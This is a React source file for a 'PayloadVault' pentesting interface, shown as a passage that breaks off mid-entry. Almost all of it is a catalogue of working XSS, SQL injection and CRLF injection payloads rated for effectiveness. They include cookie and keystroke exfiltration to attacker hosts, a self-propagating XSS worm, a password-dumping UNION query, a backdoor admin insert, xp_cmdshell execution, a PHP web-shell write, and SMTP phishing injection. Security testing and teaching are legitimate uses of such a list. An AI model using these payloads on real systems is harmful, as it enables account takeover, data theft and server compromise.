import React, { useState, useMemo } from 'react';
import Sidebar from '../../components/navigation/Sidebar';
import Breadcrumb from '../../components/navigation/Breadcrumb';
import GlobalSearch from '../../components/navigation/GlobalSearch';
import FilterControls from './components/FilterControls';
import CategorySection from './components/CategorySection';
import BulkOperations from './components/BulkOperations';
import { ModeToggle, EmptyState } from '../../components/shared';
import Icon from '../../components/AppIcon';

const PayloadVault = () => {
  const [mode, setMode] = useState('beginner');
  const [selectedPayloads, setSelectedPayloads] = useState([]);
  const [filters, setFilters] = useState({
    vulnerability: 'all',
    complexity: 'all',
    target: 'all',
    bypass: 'all'
  });

  const allPayloads = [
    // Reflected XSS Payloads - 20 payloads
    {
      id: 1,
      name: "Basic Script Tag - Reflected",
      category: "Reflected XSS",
      difficulty: "Beginner",
      code: "<script>alert('XSS')</script>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Simple script injection in HTML context. Tests if any sanitization is present in reflected parameters.",
      bypassTechnique: "Direct injection"
    },
    {
      id: 2,
      name: "IMG Onerror Event - Reflected",
      category: "Reflected XSS",
      difficulty: "Beginner",
      code: "<img src=x onerror=alert('XSS')>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Image error event handler. Bypasses basic <script> tag filters in URL parameters.",
      bypassTechnique: "Event-based execution"
    },
    {
      id: 3,
      name: "SVG Onload Event - Reflected",
      category: "Reflected XSS",
      difficulty: "Beginner",
      code: "<svg onload=alert('XSS')>",
      effectiveness: 4,
      target: "JavaScript",
      description: "SVG element with onload event. Works in modern browsers and bypasses many content filters.",
      bypassTechnique: "SVG context breaking"
    },
    {
      id: 4,
      name: "Body Onload Attribute - Reflected",
      category: "Reflected XSS",
      difficulty: "Beginner",
      code: "<body onload=alert('XSS')>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Body tag onload event. Executes when page loads if tag injection is possible in search results.",
      bypassTechnique: "Event-based execution"
    },
    {
      id: 5,
      name: "Input Autofocus Onfocus - Reflected",
      category: "Reflected XSS",
      difficulty: "Beginner",
      code: "<input autofocus onFocus=alert('XSS')>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Input field with autofocus triggers onfocus event automatically. No user interaction needed.",
      bypassTechnique: "Event-based execution"
    },
    {
      id: 6,
      name: "Attribute Breaking XSS - Reflected",
      category: "Reflected XSS",
      difficulty: "Intermediate",
      code: "\" onMouseOver=\"alert('XSS')",
      effectiveness: 5,
      target: "JavaScript",
      description: "Breaks out of HTML attribute context using double quotes to inject event handler in reflected parameters.",
      bypassTechnique: "Attribute context breaking"
    },
    {
      id: 7,
      name: "Single Quote Attribute Break - Reflected",
      category: "Reflected XSS",
      difficulty: "Intermediate",
      code: "' onClick='alert(\"XSS\")'",
      effectiveness: 4,
      target: "JavaScript",
      description: "Breaks attribute context with single quotes. Alternative to double quote breaking in search queries.",
      bypassTechnique: "Attribute context breaking"
    },
    {
      id: 8,
      name: "JavaScript URL Protocol - Reflected",
      category: "Reflected XSS",
      difficulty: "Intermediate",
      code: "javascript:alert('XSS')",
      effectiveness: 4,
      target: "JavaScript",
      description: "JavaScript protocol in href or src attributes. Executes code when link is clicked from search results.",
      bypassTechnique: "Protocol-based injection"
    },
    {
      id: 9,
      name: "Data URI XSS - Reflected",
      category: "Reflected XSS",
      difficulty: "Intermediate",
      code: "data:text/html,<script>alert('XSS')</script>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Data URI scheme embeds HTML with JavaScript. Works in href attributes in reflected content.",
      bypassTechnique: "URI scheme exploitation"
    },
    {
      id: 10,
      name: "Backtick Template String - Reflected",
      category: "Reflected XSS",
      difficulty: "Intermediate",
      code: "<img src=x onerror=alert`XSS`>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Uses ES6 template strings to bypass parentheses filters. Modern browser syntax for reflected XSS.",
      bypassTechnique: "Syntax variation"
    },
    {
      id: 11,
      name: "URL Encoded Payload - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "%3Cscript%3Ealert('XSS')%3C/script%3E",
      effectiveness: 4,
      target: "JavaScript",
      description: "URL encoding bypasses basic string matching. Server must decode before rendering in response.",
      bypassTechnique: "URL encoding"
    },
    {
      id: 12,
      name: "Double URL Encoding - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E",
      effectiveness: 5,
      target: "JavaScript",
      description: "Double encoding for filters that decode only once. Requires double decoding in reflected context.",
      bypassTechnique: "Double encoding"
    },
    {
      id: 13,
      name: "Mixed Case Bypass - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<ScRiPt>alert('XSS')</sCrIpT>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Mixed case bypasses case-sensitive filters in URL parameters. Simple but effective technique.",
      bypassTechnique: "Case manipulation"
    },
    {
      id: 14,
      name: "HTML Entity Encoding - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
      effectiveness: 3,
      target: "JavaScript",
      description: "HTML entities encoded script tags. Browser decodes before execution in reflected output.",
      bypassTechnique: "HTML entity encoding"
    },
    {
      id: 15,
      name: "Character Code Execution - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Character codes bypass string matching. Obfuscates alert('XSS') payload in reflected context.",
      bypassTechnique: "Character encoding"
    },
    {
      id: 16,
      name: "Base64 Data URI - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\"></iframe>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Base64 encoded HTML in data URI. Decodes to <script>alert('XSS')</script> in reflected iframe.",
      bypassTechnique: "Base64 encoding"
    },
    {
      id: 17,
      name: "Polyglot XSS - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onMouseOver=1/+/[*/[]/+alert(1)//'>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Multi-context payload works in HTML, attribute, and JavaScript contexts simultaneously in reflected output.",
      bypassTechnique: "Context-agnostic injection"
    },
    {
      id: 18,
      name: "Mutation XSS (mXSS) - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<noscript>&lt;p title=\"</noscript><img src=x onerror=alert(1)>\">",
      effectiveness: 5,
      target: "JavaScript",
      description: "Exploits browser HTML mutation during parsing. Bypasses sanitizers that parse differently in reflected context.",
      bypassTechnique: "HTML mutation"
    },
    {
      id: 19,
      name: "Filter Evasion Comment - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<script>&lt;!-- \nalert('XSS') \n//--&gt;</script>",
      effectiveness: 3,
      target: "JavaScript",
      description: "HTML comments and newlines bypass pattern matching in reflected parameters. Confuses simple filters.",
      bypassTechnique: "Comment-based bypass"
    },
    {
      id: 20,
      name: "Null Byte Injection - Reflected",
      category: "Reflected XSS",
      difficulty: "Advanced",
      code: "<script>alert('XSS')%00</script>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Null byte terminates string matching in some filters. Language-dependent vulnerability in reflected output.",
      bypassTechnique: "Null byte injection"
    },

    // Stored XSS Payloads - 20 payloads
    {
      id: 101,
      name: "Comment Field XSS",
      category: "Stored XSS",
      difficulty: "Beginner",
      code: "<script>fetch('//attacker.com?c='+document.cookie)</script>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Cookie exfiltration from comment field. Steals session tokens from all viewers.",
      bypassTechnique: "Cookie stealing"
    },
    {
      id: 102,
      name: "Profile Bio XSS",
      category: "Stored XSS",
      difficulty: "Beginner",
      code: "<img src=x onerror=\"fetch('//evil.com?d='+btoa(document.body.innerHTML))\">",
      effectiveness: 5,
      target: "JavaScript",
      description: "Exfiltrates entire page HTML from profile bio. Encodes with base64 to avoid encoding issues.",
      bypassTechnique: "Data exfiltration"
    },
    {
      id: 103,
      name: "Forum Post Keylogger",
      category: "Stored XSS",
      difficulty: "Beginner",
      code: "<script>document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}</script>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Keylogger injection in forum post. Captures all keystrokes from viewing users.",
      bypassTechnique: "Keylogging"
    },
    {
      id: 104,
      name: "Self-Propagating XSS Worm",
      category: "Stored XSS",
      difficulty: "Beginner",
      code: "<script>fetch('/api/comment',{method:'POST',body:JSON.stringify({text:document.body.innerHTML})})</script>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Worm that copies itself to new comments. Spreads automatically to all comment sections.",
      bypassTechnique: "Self-propagation"
    },
    {
      id: 105,
      name: "Username XSS",
      category: "Stored XSS",
      difficulty: "Beginner",
      code: "<svg/onload=navigator.sendBeacon('//evil.com',document.cookie)>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Stored in username field. SendBeacon ensures data transmission even if page unloads.",
      bypassTechnique: "SendBeacon API"
    },
    {
      id: 106,
      name: "Filename Metadata XSS",
      category: "Stored XSS",
      difficulty: "Intermediate",
      code: "\"><script>alert(document.domain)</script>.jpg",
      effectiveness: 4,
      target: "JavaScript",
      description: "Malicious filename with XSS payload. Executes when filename is displayed without sanitization.",
      bypassTechnique: "Metadata injection"
    },
    {
      id: 107,
      name: "Product Review XSS",
      category: "Stored XSS",
      difficulty: "Intermediate",
      code: "<iframe src=javascript:alert(origin)>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Iframe with JavaScript URI in product review. Shows origin to verify context.",
      bypassTechnique: "Iframe injection"
    },
    {
      id: 108,
      name: "Message Board Avatar",
      category: "Stored XSS",
      difficulty: "Intermediate",
      code: "<img src='x' onerror='eval(atob(\"ZG9jdW1lbnQubG9jYXRpb249Ii8vYXR0YWNrZXIuY29tP2M9Iithb3RvYSggZG9jdW1lbnQuY29va2llKQ==\"))'>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Base64 encoded payload in avatar img tag. Decodes to cookie stealing redirect.",
      bypassTechnique: "Base64 obfuscation"
    },
    {
      id: 109,
      name: "Chat Message HTML Injection",
      category: "Stored XSS",
      difficulty: "Intermediate",
      code: "<style>body{background:url('//evil.com?c='concat(document.cookie))}</style>",
      effectiveness: 3,
      target: "JavaScript",
      description: "CSS exfiltration via background URL. Works even if script tags are filtered.",
      bypassTechnique: "CSS injection"
    },
    {
      id: 110,
      name: "User Status XSS",
      category: "Stored XSS",
      difficulty: "Intermediate",
      code: "<details open ontoggle=alert(document.domain)>",
      effectiveness: 3,
      target: "JavaScript",
      description: "HTML5 details element with ontoggle event. Fires immediately when rendered open.",
      bypassTechnique: "HTML5 event"
    },
    {
      id: 111,
      name: "Blog Post Script Storage",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<script>setInterval(()=&gt;fetch('//log.com?u='+document.location),5000)</script>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Periodic location tracking. Logs user navigation every 5 seconds.",
      bypassTechnique: "Interval tracking"
    },
    {
      id: 112,
      name: "Comment Mutation Bypass",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
      effectiveness: 5,
      target: "JavaScript",
      description: "MathML mutation XSS. Browser HTML parser mutations bypass sanitizers.",
      bypassTechnique: "HTML mutation"
    },
    {
      id: 113,
      name: "Markdown to HTML XSS",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "[XSS](javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))",
      effectiveness: 4,
      target: "JavaScript",
      description: "Markdown link with JavaScript URI containing base64 payload. Targets Markdown renderers.",
      bypassTechnique: "Markdown injection"
    },
    {
      id: 114,
      name: "BBCode Forum XSS",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "[url=javascript:alert(document.cookie)]Click[/url]",
      effectiveness: 4,
      target: "JavaScript",
      description: "BBCode URL tag with JavaScript protocol. Exploits BBCode parsers in forums.",
      bypassTechnique: "BBCode injection"
    },
    {
      id: 115,
      name: "Rich Text Editor Bypass",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<p contenteditable onBlur=alert(1)>Click to edit</p>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Contenteditable with onblur event. Fires when user interacts and clicks away.",
      bypassTechnique: "Contenteditable abuse"
    },
    {
      id: 116,
      name: "JSON Stored XSS",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "{\"name\":\"<img src=x onerror=alert(1)>\",\"message\":\"test\"}",
      effectiveness: 4,
      target: "JavaScript",
      description: "XSS payload in JSON field. Executes when JSON is rendered as HTML without escaping.",
      bypassTechnique: "JSON injection"
    },
    {
      id: 117,
      name: "XML Entity Stored XSS",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<?xml version=\"1.0\"?><comment><text><![CDATA[<script>alert(1)</script>]]></text></comment>",
      effectiveness: 4,
      target: "JavaScript",
      description: "CDATA section in XML comment. Bypasses XML sanitization if rendered as HTML.",
      bypassTechnique: "XML CDATA"
    },
    {
      id: 118,
      name: "Template Engine Injection",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "{{constructor.constructor('alert(document.domain)')()}}",
      effectiveness: 5,
      target: "JavaScript",
      description: "Server-side template injection. Breaks out of template sandbox to execute code.",
      bypassTechnique: "Template injection"
    },
    {
      id: 119,
      name: "SVG Stored Foreign Object",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
      effectiveness: 4,
      target: "JavaScript",
      description: "SVG foreignObject with embedded HTML script. Bypasses SVG-only content restrictions.",
      bypassTechnique: "SVG foreignObject"
    },
    {
      id: 120,
      name: "Unicode Normalization XSS",
      category: "Stored XSS",
      difficulty: "Advanced",
      code: "<ſcript>alert(1)</ſcript>",
      effectiveness: 3,
      target: "JavaScript",
      description: "Unicode lookalike characters (ſ = long s). Normalizes to 'script' after storage.",
      bypassTechnique: "Unicode normalization"
    },

    // DOM-Based XSS Payloads - 20 payloads
    {
      id: 201,
      name: "Location Hash XSS",
      category: "DOM-Based XSS",
      difficulty: "Beginner",
      code: "#<img src=x onerror=alert(document.domain)>",
      effectiveness: 5,
      target: "JavaScript",
      description: "URL fragment processed by JavaScript. Common in client-side routing and anchor handling.",
      bypassTechnique: "Hash fragment"
    },
    {
      id: 202,
      name: "Location Search Parameter",
      category: "DOM-Based XSS",
      difficulty: "Beginner",
      code: "?search=<img src=x onerror=alert(1)>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Query parameter accessed via location.search. Vulnerable if directly rendered in DOM.",
      bypassTechnique: "Query parameter"
    },
    {
      id: 203,
      name: "Document.write DOM XSS",
      category: "DOM-Based XSS",
      difficulty: "Beginner",
      code: "#<script>document.write('<img src=x onerror=alert(1)>')</script>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Document.write with unsanitized input. Direct DOM manipulation without validation.",
      bypassTechnique: "Document.write sink"
    },
    {
      id: 204,
      name: "InnerHTML Sink",
      category: "DOM-Based XSS",
      difficulty: "Beginner",
      code: "#<img src=x onerror=this.src='//evil.com?c='+document.cookie>",
      effectiveness: 5,
      target: "JavaScript",
      description: "innerHTML assignment with URL fragment. Cookie exfiltration via img src manipulation.",
      bypassTechnique: "InnerHTML sink"
    },
    {
      id: 205,
      name: "Eval DOM Source",
      category: "DOM-Based XSS",
      difficulty: "Beginner",
      code: "#';alert(document.domain);//",
      effectiveness: 4,
      target: "JavaScript",
      description: "Breaking out of eval() statement. Single quote breaks context, semicolon ends statement.",
      bypassTechnique: "Eval injection"
    },
    {
      id: 206,
      name: "Client-side Template XSS",
      category: "DOM-Based XSS",
      difficulty: "Intermediate",
      code: "#{{constructor.constructor('alert(1)')()}}",
      effectiveness: 5,
      target: "JavaScript",
      description: "Template injection in client-side frameworks. Constructor chain escapes sandbox.",
      bypassTechnique: "Template sandbox escape"
    },
    {
      id: 207,
      name: "PostMessage XSS",
      category: "DOM-Based XSS",
      difficulty: "Intermediate",
      code: "<iframe src='//evil.com' onload='this.contentWindow.postMessage({\"__proto__\":{\"isAdmin\":true}},\"*\")'></iframe>",
      effectiveness: 4,
      target: "JavaScript",
      description: "Prototype pollution via postMessage. Injects admin privilege through proto chain.",
      bypassTechnique: "PostMessage pollution"
    },
    {
      id: 208,
      name: "localStorage XSS",
      category: "DOM-Based XSS",
      difficulty: "Intermediate",
      code: "localStorage.setItem('theme','<img src=x onerror=alert(origin)>');",
      effectiveness: 4,
      target: "JavaScript",
      description: "Persistent DOM XSS via localStorage. Executes every time stored value is rendered.",
      bypassTechnique: "LocalStorage persistence"
    },
    {
      id: 209,
      name: "DOM Clobbering",
      category: "DOM-Based XSS",
      difficulty: "Intermediate",
      code: "<form name=test><input name=action value='javascript:alert(1)'>",
      effectiveness: 3,
      target: "JavaScript",
      description: "HTML id/name attributes override DOM properties. Clobbers form.action for XSS.",
      bypassTechnique: "DOM clobbering"
    },
    {
      id: 210,
      name: "Angular Expression Injection",
      category: "DOM-Based XSS",
      difficulty: "Intermediate",
      code: "{{constructor.constructor('alert(1)')()}}",
      effectiveness: 5,
      target: "JavaScript",
      description: "Angular 1.x template injection. Constructor chain breaks sandbox protection.",
      bypassTechnique: "Angular sandbox bypass"
    },
    {
      id: 211,
      name: "Vue.js Template Injection",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "{{_c.constructor('alert(1)')()}}",
      effectiveness: 5,
      target: "JavaScript",
      description: "Vue.js compilation context escape. _c is Vue\'s createElement shorthand.",
      bypassTechnique: "Vue sandbox escape"
    },
    {
      id: 212,
      name: "React dangerouslySetInnerHTML",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
      effectiveness: 4,
      target: "JavaScript",
      description: "React\'s explicit HTML rendering. Bypasses React\'s XSS protection when misused.",
      bypassTechnique: "React unsafe rendering"
    },
    {
      id: 213,
      name: "Prototype Pollution to XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
      effectiveness: 5,
      target: "JavaScript",
      description: "Pollutes Object.prototype.innerHTML. Affects all objects inheriting from Object.",
      bypassTechnique: "Prototype pollution"
    },
    {
      id: 214,
      name: "DOM-based Open Redirect XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "#javascript:alert(document.domain)",
      effectiveness: 4,
      target: "JavaScript",
      description: "JavaScript protocol in location assignment. Executes when page redirects to hash value.",
      bypassTechnique: "JavaScript protocol"
    },
    {
      id: 215,
      name: "Web Worker XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "new Worker('data:text/javascript,alert(origin)')",
      effectiveness: 3,
      target: "JavaScript",
      description: "Data URI in Web Worker. Executes JavaScript in worker thread context.",
      bypassTechnique: "Web Worker data URI"
    },
    {
      id: 216,
      name: "ServiceWorker Registration XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "navigator.serviceWorker.register('data:text/javascript,self.addEventListener(\"fetch\",e=>e.respondWith(new Response(\"<script>alert(1)</script>\")))')",
      effectiveness: 5,
      target: "JavaScript",
      description: "ServiceWorker with data URI. Intercepts all fetch requests to inject payloads.",
      bypassTechnique: "ServiceWorker injection"
    },
    {
      id: 217,
      name: "Mutation Observer XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "new MutationObserver(m=>eval(m[0].addedNodes[0].textContent)).observe(document.body,{childList:true});setTimeout(()=>document.body.innerHTML+='<x>alert(1)</x>',100)",
      effectiveness: 4,
      target: "JavaScript",
      description: "MutationObserver eval on DOM changes. Monitors and executes newly added content.",
      bypassTechnique: "MutationObserver abuse"
    },
    {
      id: 218,
      name: "RegExp Source Injection",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "new RegExp(location.hash.slice(1)).source; // Hash: #(?=.*eval(alert(1)))",
      effectiveness: 3,
      target: "JavaScript",
      description: "RegExp lookahead execution. Positive lookahead (?=) evaluates expression as code.",
      bypassTechnique: "RegExp exploitation"
    },
    {
      id: 219,
      name: "ArrayBuffer toString XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "new Uint8Array([60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62]).reduce((a,b)=>a+String.fromCharCode(b),'')",
      effectiveness: 3,
      target: "JavaScript",
      description: "Byte array to string conversion. Obfuscates '<script>alert(1)</script>' as bytes.",
      bypassTechnique: "Byte array obfuscation"
    },
    {
      id: 220,
      name: "WebAssembly Instance XSS",
      category: "DOM-Based XSS",
      difficulty: "Advanced",
      code: "WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,6,1,96,0,1,127,3,2,1,0,7,10,1,6,105,110,118,111,107,101,0,0,10,9,1,7,0,65,42,106,252,11]),{env:{alert:alert}}).then(({instance})=>instance.exports.invoke())",
      effectiveness: 4,
      target: "JavaScript",
      description: "WebAssembly calling JavaScript alert. Binary WASM module with imported alert function.",
      bypassTechnique: "WebAssembly injection"
    },

    // SQL Injection Payloads - Existing
    {
      id: 300,
      name: "Basic SQL Injection",
      category: "SQL Injection",
      difficulty: "Beginner",
      code: "' OR '1'='1",
      effectiveness: 5,
      target: "PHP",
      description: "Classic SQL injection that bypasses authentication by making the WHERE clause always true.",
      bypassTechnique: "Logic manipulation"
    },
    {
      id: 301,
      name: "Union-based SQLi",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' UNION SELECT NULL, username, password FROM users--",
      effectiveness: 5,
      target: "PHP",
      description: "Extracts data from database using UNION operator to combine results.",
      bypassTechnique: "Query stacking"
    },
    {
      id: 302,
      name: "Time-based Blind SQLi",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "' AND IF(1=1, SLEEP(5), 0)--",
      effectiveness: 4,
      target: "PHP",
      description: "Blind SQL injection using time delays to infer database information.",
      bypassTechnique: "Timing-based inference"
    },
    {
      id: 303,
      name: "Boolean-based Blind SQLi",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
      effectiveness: 4,
      target: "PHP",
      description: "Extracts data character by character using boolean conditions.",
      bypassTechnique: "Boolean inference"
    },
    {
      id: 304,
      name: "Error-based SQLi (MySQL)",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--",
      effectiveness: 5,
      target: "PHP",
      description: "Forces MySQL error message to reveal data using EXTRACTVALUE function.",
      bypassTechnique: "Error message exploitation"
    },
    {
      id: 305,
      name: "Stacked Queries - Admin Insert",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "'; INSERT INTO users(username,password,role) VALUES('hacker','pass123','admin');--",
      effectiveness: 5,
      target: "PHP",
      description: "Creates backdoor admin account using stacked query execution.",
      bypassTechnique: "Query stacking"
    },
    {
      id: 306,
      name: "MSSQL xp_cmdshell",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "'; EXEC xp_cmdshell 'whoami';--",
      effectiveness: 5,
      target: "ASP.NET",
      description: "Executes OS commands on SQL Server via xp_cmdshell stored procedure.",
      bypassTechnique: "Command execution"
    },
    {
      id: 307,
      name: "PostgreSQL File Read",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "' UNION SELECT NULL, pg_read_file('/etc/passwd'), NULL--",
      effectiveness: 4,
      target: "Python",
      description: "Reads server files using PostgreSQL pg_read_file function.",
      bypassTechnique: "File system access"
    },
    {
      id: 308,
      name: "MySQL INTO OUTFILE",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
      effectiveness: 5,
      target: "PHP",
      description: "Writes web shell to server using MySQL file write capability.",
      bypassTechnique: "File write"
    },
    {
      id: 309,
      name: "Second-Order SQLi",
      category: "SQL Injection",
      difficulty: "Advanced",
      code: "admin'--",
      effectiveness: 4,
      target: "PHP",
      description: "Stored payload that executes when retrieved later in different context.",
      bypassTechnique: "Delayed execution"
    },
    {
      id: 310,
      name: "WAF Bypass - Comment Inline",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' UN/**/ION SEL/**/ECT password FR/**/OM users--",
      effectiveness: 4,
      target: "PHP",
      description: "Bypasses WAF keyword detection using inline SQL comments.",
      bypassTechnique: "Comment obfuscation"
    },
    {
      id: 311,
      name: "WAF Bypass - Case Variation",
      category: "SQL Injection",
      difficulty: "Beginner",
      code: "' uNiOn SeLeCt password FrOm users--",
      effectiveness: 3,
      target: "PHP",
      description: "Evades case-sensitive WAF rules using mixed case keywords.",
      bypassTechnique: "Case manipulation"
    },
    {
      id: 312,
      name: "Oracle ROWNUM Extraction",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' UNION SELECT NULL, username, password FROM (SELECT ROWNUM r, username, password FROM users) WHERE r=1--",
      effectiveness: 4,
      target: "Java",
      description: "Oracle-specific data extraction using ROWNUM for pagination bypass.",
      bypassTechnique: "Oracle syntax"
    },
    {
      id: 313,
      name: "GROUP_CONCAT Dump",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' UNION SELECT NULL, GROUP_CONCAT(username,':',password), NULL FROM users--",
      effectiveness: 5,
      target: "PHP",
      description: "Extracts all rows in single query using MySQL GROUP_CONCAT function.",
      bypassTechnique: "Aggregation abuse"
    },
    {
      id: 314,
      name: "Hex Encoding Bypass",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' UNION SELECT 0x61646d696e, password FROM users--",
      effectiveness: 4,
      target: "PHP",
      description: "Uses hex encoding to bypass string filtering and WAF rules.",
      bypassTechnique: "Hex encoding"
    },
    {
      id: 315,
      name: "Subquery Data Extraction",
      category: "SQL Injection",
      difficulty: "Intermediate",
      code: "' AND (SELECT password FROM users WHERE username='admin')='test",
      effectiveness: 4,
      target: "PHP",
      description: "Uses subquery in WHERE clause to test for specific values.",
      bypassTechnique: "Subquery injection"
    },

    // CRLF Injection Payloads - UPDATED AND EXPANDED
    {
      id: 400,
      name: "Basic CRLF Cookie Injection",
      category: "CRLF Injection",
      difficulty: "Beginner",
      code: "%0d%0aSet-Cookie: admin=true",
      effectiveness: 4,
      target: "PHP",
      description: "Injects HTTP headers using CRLF characters to set malicious cookies. Works when user input is reflected in HTTP headers.",
      bypassTechnique: "Header injection",
      type: "Cookie Injection"
    },
    {
      id: 401,
      name: "HTTP Response Splitting",
      category: "CRLF Injection",
      difficulty: "Intermediate",
      code: "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>",
      effectiveness: 5,
      target: "PHP",
      description: "Splits HTTP response to inject arbitrary content into the response body. Creates fake HTTP response with malicious payload.",
      bypassTechnique: "Response manipulation",
      type: "Response Splitting"
    },
    {
      id: 402,
      name: "Log Injection via CRLF",
      category: "CRLF Injection",
      difficulty: "Intermediate",
      code: "test%0d%0aINFO: Admin logged in successfully from IP 127.0.0.1",
      effectiveness: 3,
      target: "Python",
      description: "Injects fake log entries to manipulate application logs and hide malicious activity. Used for log poisoning attacks.",
      bypassTechnique: "Log poisoning",
      type: "Log Injection"
    },
    {
      id: 403,
      name: "Location Header XSS via CRLF",
      category: "CRLF Injection",
      difficulty: "Advanced",
      code: "%0d%0aLocation: javascript:alert(document.domain)%0d%0a%0d%0a",
      effectiveness: 5,
      target: "Java",
      description: "Injects Location header with JavaScript protocol to execute XSS. Redirects user to execute malicious JavaScript.",
      bypassTechnique: "Header injection",
      type: "XSS via Header"
    },
    {
      id: 404,
      name: "Cache Poisoning via CRLF",
      category: "CRLF Injection",
      difficulty: "Advanced",
      code: "%0d%0aX-XSS-Protection: 0%0d%0aX-Frame-Options: ALLOW%0d%0a%0d%0a",
      effectiveness: 4,
      target: "Node.js",
      description: "Disables security headers via CRLF injection to enable XSS and clickjacking attacks. Poisons cache with insecure headers.",
      bypassTechnique: "Security header bypass",
      type: "Cache Poisoning"
    },
    {
      id: 405,
      name: "Email Header Injection",
      category: "CRLF Injection",
      difficulty: "Intermediate",
      code: "victim@example.com%0d%0aBcc: attacker@evil.com%0d%0aSubject: Phishing",
      effectiveness: 4,
      target: "PHP",
      description: "Injects additional email headers to send copies to attacker or modify email subject. Common in contact forms.",
      bypassTechnique: "Email header injection",
      type: "Email Injection"
    },
    {
      id: 406,
      name: "SMTP Command Injection",
      category: "CRLF Injection",
      difficulty: "Advanced",
      code: "user@example.com%0d%0aMAIL FROM: attacker@evil.com%0d%0aRCPT TO: victim@example.com%0d%0aDATA%0d%0aPhishing email content",
      effectiveness: 5,
      target: "Python",
      description: "Injects SMTP commands via CRLF to send arbitrary emails through vulnerable mail server. Full SMTP protocol exploitation.",
      bypassTechnique: "SMTP injection",
      type: "SMTP Injection"
    },
    {
      id: 407,
      name: "Content-Type Header Injection",
      category: "CRLF Injection",
      difficulty: "Intermediate",
      code: "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS')</script>",
      effectiveness: 4,
      target: "Java",
      description: "Changes Content-Type header to text/html to render injected script tags. Converts non-HTML responses to HTML for XSS.",
      bypassTechnique: "Content-Type manipulation",
      type: "Content-Type Injection"
    },

    // IDOR Payloads - Keep existing
    {
      id: 500,
      name: "Sequential ID IDOR",
      category: "IDOR",
      difficulty: "Beginner",
      code: "GET /api/user/123 → /api/user/124",
      effectiveness: 5,
